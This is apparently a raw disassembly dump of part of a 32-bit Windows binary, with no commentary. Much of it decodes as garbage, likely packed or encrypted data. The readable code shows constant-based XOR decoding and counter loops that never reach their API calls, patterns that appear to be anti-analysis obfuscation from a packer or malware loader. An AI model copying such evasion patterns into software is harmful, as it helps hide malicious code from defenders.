  408a0a:	rcr    BYTE PTR [ebp+eiz*1-0x6a197a57],0x93
  408a12:	cmp    al,0xa1
  408a14:	sti    
  408a15:	push   ebx
  408a16:	jecxz  0x408a90
  408a18:	dec    ecx
  408a19:	mov    edi,0x3d9c502e
  408a1e:	mov    eax,ds:0x718b3fb9
  408a23:	dec    ecx
  408a24:	sar    BYTE PTR [ecx+ecx*4+0x73],1
  408a28:	cs sub al,0x13
  408a2b:	cmp    edi,DWORD PTR [ebx+ecx*2-0x280855e3]
  408a32:	jae    0x4089ce
  408a34:	neg    BYTE PTR [edx-0x464fbb98]
  408a3a:	inc    esi
  408a3b:	lods   eax,DWORD PTR ds:[esi]
  408a3d:	and    al,BYTE PTR [esi-0x69a93bd1]
  408a43:	sbb    eax,0x6c6714ed
  408a48:	xchg   BYTE PTR ds:0x2e3d0ede,dh
  408a4e:	lea    ebx,[edi-0x4f2e86d8]
  408a54:	stos   DWORD PTR es:[edi],eax
  408a55:	add    dl,BYTE PTR [eax]
  408a57:	jne    0x408a77
  408a59:	mov    ds:0x93b42552,al
  408a5e:	(bad)  
  408a5f:	(bad)  fs:[esi-0x73]
  408a63:	sub    al,0x72
  408a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a66:	out    dx,al
  408a67:	pusha  
  408a68:	push   ebp
  408a69:	or     DWORD PTR [esi],ebp
  408a6b:	xchg   ebx,eax
  408a6c:	cli    
  408a6d:	xchg   ecx,eax
  408a6e:	call   0x617b52de
  408a73:	jb     0x408a5f
  408a75:	push   ss
  408a76:	jne    0x408a16
  408a78:	or     ecx,0x81161d8f
  408a7e:	mov    eax,ecx
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e76a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e76a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e76a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430496
  408ab1:	push   0x42ee30
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42eaac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e76a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e76a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e766,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4304c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	call   0xa5b67ff5
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b39
  408b1f:	int    0x31
  408b21:	daa    
  408b22:	adc    esi,DWORD PTR [edx-0x479da0d5]
  408b28:	push   0x6f24617b
  408b2d:	pusha  
  408b2e:	inc    esi
  408b2f:	mov    WORD PTR [ebp+0x35fad656],fs
  408b35:	cdq    
  408b36:	call   0xae22ed5d
  408b3b:	pop    ebx
  408b3c:	jb     0x408b90
  408b3e:	ror    ecx,1
  408b40:	aaa    
  408b41:	pop    edx
  408b42:	mov    esi,0x911931d8
  408b47:	inc    ecx
  408b48:	iret   
  408b49:	mov    cs,WORD PTR [esi]
  408b4b:	mov    cs,WORD PTR [ecx]
  408b4d:	fistp  DWORD PTR ds:0x66c4932c
  408b53:	inc    esi
  408b54:	dec    esp
  408b55:	nop
  408b56:	(bad)  
  408b57:	mov    al,0x15
  408b59:	cli    
  408b5a:	or     eax,DWORD PTR [esi]
  408b5c:	inc    esi
  408b5d:	cmp    BYTE PTR [ebp+0x289ed756],bl
  408b63:	(bad)  
  408b64:	mul    dl
  408b66:	push   ebp
  408b67:	fsub   DWORD PTR [eax+0xd8cfe78]
  408b6d:	add    eax,0x9180709c
  408b72:	xor    DWORD PTR [ebx],ebx
  408b74:	push   esi
  408b75:	adc    bh,dh
  408b77:	sbb    eax,0xce3391b4
  408b7c:	pmullw mm1,mm5
  408b7f:	adc    eax,ebx
  408b81:	repnz cld 
  408b83:	pusha  
  408b84:	sti    
  408b85:	sar    DWORD PTR [ecx+0x336b73dc],cl
  408b8b:	inc    ecx
  408b8c:	push   esp
  408b8d:	shl    eax,cl
  408b8f:	cmp    edx,DWORD PTR [esi]
  408b91:	arpl   WORD PTR [ecx+0x40],dx
  408b94:	sbb    eax,0x4b14d602
  408b99:	mov    bh,0x96
  408b9b:	ret    0x4c3f
  408b9e:	es jp  0x408bd5
  408ba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ba2:	cmp    eax,0xa3220dce
  408ba7:	sub    eax,0x90bd573e
  408bac:	cmp    BYTE PTR [eax],al
  408bae:	add    BYTE PTR [esi+ecx*2],ah
  408bb1:	dec    edx
  408bb2:	cmp    al,0x69
  408bb4:	and    ah,BYTE PTR [ebx]
  408bb6:	xchg   esp,eax
  408bb7:	xchg   esp,eax
  408bb8:	inc    ebx
  408bb9:	enter  0xb787,0x24
  408bbd:	ins    DWORD PTR es:[edi],dx
  408bbe:	jge    0x408bc4
  408bc0:	xor    ch,BYTE PTR [ebp+0x4f]
  408bc3:	lds    eax,FWORD PTR [ebx-0x4682e6e7]
  408bc9:	sti    
  408bca:	mov    dl,0xf0
  408bcc:	jge    0x408bb8
  408bce:	jg     0x408c03
  408bd0:	mov    bl,0x4
  408bd2:	pop    eax
  408bd3:	xor    eax,0x96ad83f6
  408bd8:	ror    BYTE PTR [ebx+ecx*1],1
  408bdb:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  408bdd:	pop    esi
  408bde:	cmp    cl,BYTE PTR [edi-0x6f]
  408be1:	leave  
  408be2:	add    ah,bl
  408be4:	ins    BYTE PTR es:[edi],dx
  408be5:	mov    ds:0x8a196570,eax
  408bea:	js     0x408bcd
  408bec:	sahf   
  408bed:	inc    ebx
  408bee:	sbb    bl,BYTE PTR gs:[esi]
  408bf1:	test   BYTE PTR [eax],ch
  408bf3:	call   0x9c19:0xb3383f0b
  408bfa:	mov    ds:0x63abc883,al
  408bff:	stc    
  408c00:	addr16 add eax,0x7b613ea
  408c06:	sbb    eax,0xf1e87061
  408c0b:	mov    ebx,DWORD PTR [esp+ebx*1]
  408c0e:	mov    ebp,0xa216f03d
  408c13:	pop    edi
  408c14:	sub    ebp,DWORD PTR [ebx+0x6f]
  408c17:	or     al,BYTE PTR [esi-0xa4f8f4c]
  408c1d:	sti    
  408c1e:	(bad)  
  408c1f:	jnp    0x408c7f
  408c21:	or     edx,DWORD PTR [edx-0x5b687267]
  408c27:	in     eax,0x2
  408c29:	push   cs
  408c2a:	and    al,0xe
  408c2c:	cmp    ebx,DWORD PTR [edi-0x36843f37]
  408c32:	out    dx,al
  408c33:	sbb    dh,BYTE PTR [edi+0x4886fd7c]
  408c39:	pop    edx
  408c3a:	fisttp QWORD PTR [eax-0x6e]
  408c3d:	cwde   
  408c3e:	adc    DWORD PTR [edi+ebp*1-0x30],esp
  408c42:	(bad)  
  408c43:	enter  0x5a7,0x49
  408c47:	push   eax
  408c48:	and    eax,ebx
  408c4a:	xchg   ebp,eax
  408c4b:	emms   
  408c4d:	push   0x74
  408c4f:	mov    BYTE PTR [ebx-0x7a91b2a3],bh
  408c55:	aas    
  408c56:	mov    cs,WORD PTR es:[ecx+0x63dd36fd]
  408c5d:	(bad)  
  408c5e:	cli    
  408c5f:	inc    ebp
  408c60:	(bad)  
  408c61:	repz retf 0x1330
  408c65:	rol    al,cl
  408c67:	dec    ebp
  408c68:	jmp    0xabf7:0x99072d7d
  408c6f:	xlat   BYTE PTR ds:[ebx]
  408c70:	mov    esp,0xe3ddc337
  408c75:	out    0x10,eax
  408c77:	mov    ds:0x13ceaa61,al
  408c7c:	bound  ebp,QWORD PTR [esi]
  408c7e:	lea    esi,[ecx+edi*1]
  408c81:	mov    ebp,0x453c8a4e
  408c86:	retf   0x3c8a
  408c89:	aas    
  408c8a:	pop    es
  408c8b:	dec    ecx
  408c8c:	pop    edi
  408c8d:	sub    al,0xbf
  408c8f:	bound  ebx,QWORD PTR [esi+esi*1-0x2e]
  408c93:	jmp    0xe41cbd6a
  408c98:	xchg   edi,eax
  408c99:	repz xor eax,0x583a76a1
  408c9f:	loope  0x408c48
  408ca1:	stos   DWORD PTR es:[edi],eax
  408ca2:	js     0x408c9c
  408ca4:	dec    edi
  408ca5:	push   edx
  408ca6:	std    
  408ca7:	inc    ecx
  408ca8:	adc    eax,0xbbf27cff
  408cad:	add    BYTE PTR [ebp+ebp*8+0x2],dh
  408cb1:	loope  0x408c61
  408cb3:	fsubr  DWORD PTR [ecx]
  408cb5:	outs   dx,BYTE PTR ds:[esi]
  408cb6:	jne    0x408d0e
  408cb8:	push   cs
  408cb9:	or     BYTE PTR [ebx],dh
  408cbb:	out    dx,eax
  408cbc:	out    dx,eax
  408cbd:	(bad)  
  408cbe:	cmp    eax,0xd353cf1b
  408cc3:	mov    ds:0x7703a4d9,eax
  408cc8:	mov    gs,WORD PTR [esi+0x38]
  408ccb:	push   eax
  408ccc:	push   ecx
  408ccd:	scas   eax,DWORD PTR es:[edi]
  408cce:	sub    BYTE PTR [ecx],ch
  408cd0:	cs je  0x408d26
  408cd3:	or     al,0x46
  408cd5:	and    cl,BYTE PTR [ebp-0x18]
  408cd8:	mov    ebx,0x64b865e6
  408cdd:	aaa    
  408cde:	(bad)  
  408ce0:	jmp    0xe288:0x4a25bbee
  408ce7:	(bad)  
  408ce8:	xor    DWORD PTR [ebx+eiz*1+0x1b],esi
  408cec:	lahf   
  408ced:	retf   0x99e9
  408cf0:	lods   al,BYTE PTR ds:[esi]
  408cf1:	xchg   edi,eax
  408cf2:	lds    ebx,FWORD PTR [edi+eax*1+0x5]
  408cf6:	popf   
  408cf7:	jb     0x408d2b
  408cf9:	add    BYTE PTR [ecx+0x76158b02],cl
  408cff:	add    eax,0x92a10043
  408d04:	add    eax,0xd02b0043
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	xor    DWORD PTR [edx],edi
  408d56:	add    eax,0x7ed48c37
  408d5b:	jle    0x408da2
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408d84
  408d61:	test   al,ch
  408d63:	js     0x408d59
  408d65:	in     eax,dx
  408d66:	outs   dx,DWORD PTR ds:[esi]
  408d67:	mov    ecx,0xb8731e39
  408d6c:	add    ebp,ebp
  408d6e:	mov    bl,0x26
  408d70:	adc    DWORD PTR [edx-0xf],0x49c74309
  408d77:	xor    eax,0x8f404c28
  408d7c:	jg     0x408df5
  408d7e:	xchg   ebp,eax
  408d7f:	push   esp
  408d80:	mov    bl,cl
  408d82:	cmp    edx,0xffffffc9
  408d85:	lods   eax,DWORD PTR ds:[esi]
  408d86:	data16 jo 0x408dae
  408d89:	repz xor ah,BYTE PTR [ebx-0x34]
  408d8d:	in     eax,0x7c
  408d8f:	(bad)  
  408d90:	lds    esi,FWORD PTR [ebx+ebp*2]
  408d93:	sbb    al,0x78
  408d95:	enter  0x6c90,0xdb
  408d99:	in     al,dx
  408d9a:	sbb    al,0x6b
  408d9c:	repz push ebx
  408d9e:	mov    eax,0xf4d9a8af
  408da3:	add    esi,DWORD PTR [edi]
  408da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408da6:	fiadd  WORD PTR [ecx-0x5f]
  408da9:	(bad)  
  408daa:	jmp    0x673c:0xaaac2abe
  408db1:	mov    ds:0x25707e16,al
  408db6:	loop   0x408d40
  408db8:	rol    BYTE PTR [ebx-0x1fadc6a0],0x47
  408dbf:	mov    ebp,DWORD PTR [eax-0x267b9fae]
  408dc5:	sahf   
  408dc6:	das    
  408dc7:	and    eax,0x7413b2ae
  408dcc:	in     eax,dx
  408dcd:	adc    dh,BYTE PTR [ebx+0x33]
  408dd0:	and    al,0x93
  408dd2:	(bad)  
  408dd3:	int    0x4e
  408dd5:	sub    al,0xe1
  408dd7:	das    
  408dd8:	pop    edi
  408dd9:	add    dl,BYTE PTR [eax-0x16]
  408ddc:	cmp    esi,DWORD PTR [ebp+0x6a425b4f]
  408de2:	mov    esi,0x50016c4b
  408de8:	or     ebp,DWORD PTR [ecx-0x13]
  408deb:	xor    ebp,esi
  408ded:	std    
  408dee:	add    al,0x56
  408df0:	imul   eax,DWORD PTR [ebx+0x1f6666d9],0x91cdf18
  408dfa:	xchg   ecx,eax
  408dfb:	and    edx,DWORD PTR ds:0x4958405f
  408e01:	cli    
  408e02:	xchg   esi,eax
  408e03:	xchg   ebx,eax
  408e04:	push   ebp
  408e05:	pop    esi
  408e06:	jge    0x408dc8
  408e08:	lods   al,BYTE PTR ds:[esi]
  408e09:	add    DWORD PTR [edi+0x49d4b6f1],0x37ca7a0f
  408e13:	and    bh,dh
  408e15:	fs (bad) 
  408e17:	mov    ebx,0xe523969
  408e1c:	dec    eax
  408e1d:	jge    0x408e1b
  408e1f:	lea    eax,[ecx-0x392d60b3]
  408e25:	out    0x36,al
  408e27:	jmp    0x408df1
  408e29:	pop    ss
  408e2a:	mov    edx,ecx
  408e2c:	mov    esi,0xa8175d67
  408e31:	push   DWORD PTR [esi+0x24aa6e60]
  408e37:	cmp    ebp,DWORD PTR [eax-0x67]
  408e3a:	jae    0x408e85
  408e3c:	test   eax,0x81d6d7ef
  408e41:	(bad)  
  408e42:	jmp    0x408eb5
  408e44:	retf   0xe1f7
  408e47:	xor    al,0xd6
  408e49:	push   ds
  408e4a:	mov    WORD PTR [edi+0x12],ss
  408e4d:	iret   
  408e4e:	mov    ah,0xe2
  408e50:	rol    DWORD PTR [esi+0x3cea789],cl
  408e56:	lock lds esi,FWORD PTR [esi]
  408e59:	push   0x3f
  408e5b:	iret   
  408e5c:	xlat   BYTE PTR ds:[ebx]
  408e5d:	fsub   QWORD PTR [edx+0x73]
  408e60:	mov    eax,0x38891adb
  408e65:	(bad)  
  408e66:	cld    
  408e67:	aas    
  408e68:	sub    eax,0x9c030fb5
  408e6d:	add    al,0xab
  408e6f:	pop    ebx
  408e70:	scas   eax,DWORD PTR es:[edi]
  408e71:	pop    edx
  408e72:	in     eax,dx
  408e73:	push   esi
  408e74:	jb     0x408eee
  408e76:	pop    esp
  408e77:	mov    dh,0x47
  408e79:	pushf  
  408e7a:	mov    edx,0x9a95bd84
  408e7f:	push   ds
  408e80:	xor    esi,ebp
  408e82:	stos   BYTE PTR es:[edi],al
  408e83:	push   edx
  408e84:	or     eax,0x8d0c1aa8
  408e89:	fcom   DWORD PTR [ecx]
  408e8b:	lods   al,BYTE PTR ds:[esi]
  408e8c:	and    eax,0xadfb770f
  408e91:	xor    al,0xb5
  408e93:	loopne 0x408f12
  408e95:	and    ebx,DWORD PTR [edi-0x53]
  408e98:	imul   esi,DWORD PTR [edi-0x5e30e37],0xffffff9d
  408e9f:	aaa    
  408ea0:	arpl   WORD PTR [edi+0x1f],di
  408ea3:	mov    ch,0x3e
  408ea5:	test   DWORD PTR [ebx-0x284e43bb],0x116ec399
  408eaf:	sbb    eax,0x3f5b2875
  408eb5:	mov    edx,0x3dd8970a
  408eba:	(bad)  
  408ebb:	enter  0x16d,0xe7
  408ebf:	xor    BYTE PTR [edi],bl
  408ec1:	mov    eax,ds:0x6fe6cf38
  408ec6:	sbb    eax,0x2a449cad
  408ecb:	inc    ebp
  408ecc:	mov    ebp,0x2452a3e8
  408ed1:	ret    
  408ed2:	jb     0x408e5e
  408ed4:	stos   DWORD PTR es:[edi],eax
  408ed5:	mov    al,ds:0x8215e0b2
  408eda:	inc    edi
  408edb:	aaa    
  408edc:	sub    BYTE PTR [ebx+0x6a],ah
  408edf:	pushf  
  408ee0:	ss jmp 0xe7b1:0xac34f409
  408ee8:	and    eax,0x51cbb625
  408eed:	shl    bl,1
  408eef:	push   ebx
  408ef0:	not    BYTE PTR [edi]
  408ef2:	xor    eax,0x4c8adb4a
  408ef7:	js     0x408f2a
  408ef9:	jbe    0x408f1a
  408efb:	pop    ss
  408efc:	ss adc al,0x89
  408eff:	imul   eax,DWORD PTR [edi],0x739dc83b
  408f05:	mov    dh,0xda
  408f07:	in     al,0x39
  408f09:	sbb    eax,0x9cdcf7fd
  408f0e:	adc    al,BYTE PTR [edx-0x2e]
  408f11:	call   0x6933:0x9eb4b048
  408f18:	xchg   ebp,eax
  408f19:	inc    ebp
  408f1a:	mov    bh,0xac
  408f1c:	idiv   BYTE PTR [edi+0x4f]
  408f1f:	jge    0x408ef9
  408f21:	xor    dl,0xad
  408f24:	dec    edx
  408f25:	xchg   ecx,eax
  408f26:	adc    eax,0xdf3bd3d5
  408f2b:	fcmovu st,st(6)
  408f2d:	inc    edi
  408f2e:	sti    
  408f2f:	aam    0xde
  408f31:	ds test BYTE PTR cs:[edi+ebp*2],ah
  408f36:	adc    eax,0x9d05c133
  408f3b:	jb     0x408f6f
  408f3d:	add    cl,cl
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee08,0x42e76a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430546,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ee28,0x42e766
  408f71:	call   DWORD PTR ds:0x42ea4c
  408f77:	sbb    DWORD PTR ds:0x42e762,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4304ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4304b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb04
  408faf:	sbb    DWORD PTR ds:0x430552,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e75a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4304c2,0x42ee08
  408fe0:	call   DWORD PTR ds:0x42eb80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ee24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42eb44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43055a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e762,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ea3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4304aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ee24,0x43049a
  409056:	call   DWORD PTR ds:0x42eadc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e762,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e762
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e762,ebx
  40907e:	cmp    DWORD PTR ds:0x42e762,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ebac
  409097:	cmp    DWORD PTR ds:0x42e762,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee14
  4090aa:	and    DWORD PTR ds:0x42ee20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43048e
  4090bc:	sbb    edx,DWORD PTR ds:0x43054e
  4090c2:	mov    DWORD PTR ds:0x43048e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43049e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43049e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43049e,edx
  4090e2:	cmp    DWORD PTR ds:0x43049e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e77a
  4090f9:	push   0x42e8ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ebb0
  409109:	cmp    DWORD PTR ds:0x43049e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e766,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e766
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e766,edx
  40912d:	cmp    DWORD PTR ds:0x42e766,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eab0
  40914a:	cmp    DWORD PTR ds:0x42e766,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43049a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43048a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43048a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43048a,esi
  40917b:	cmp    DWORD PTR ds:0x43048a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e87b
  40918d:	push   0x42e77a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eac8
  40919d:	cmp    DWORD PTR ds:0x43048a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43048a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43048a,esi
  4091b7:	cmp    DWORD PTR ds:0x43048a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43054e,0x4304a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43054e
  4091fe:	adc    DWORD PTR ds:0x42ee18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43048e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43048e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43048e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43049e,0x4304ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4304ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4304e2
  409277:	mov    eax,ds:0x42e99c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e76e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4304aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4304ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4304b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430556,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ee20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ee20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ee20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eacc
  409310:	mov    edi,DWORD PTR ds:0x42ee20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ee20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e776,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e772
  40934d:	adc    edx,DWORD PTR ds:0x4304c2
  409353:	mov    DWORD PTR ds:0x42e772,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ee2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ee2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ee2c,edi
  409376:	cmp    DWORD PTR ds:0x42ee2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e766
  40938b:	call   DWORD PTR ds:0x42ebb4
  409391:	cmp    DWORD PTR ds:0x42ee2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ee2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ee2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ee2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4304b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ee28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ee28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ee28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ee28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ee28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ead0
  409402:	cmp    DWORD PTR ds:0x42ee28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ee28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ee28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eab4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43055a
  40946a:	add    eax,ebx
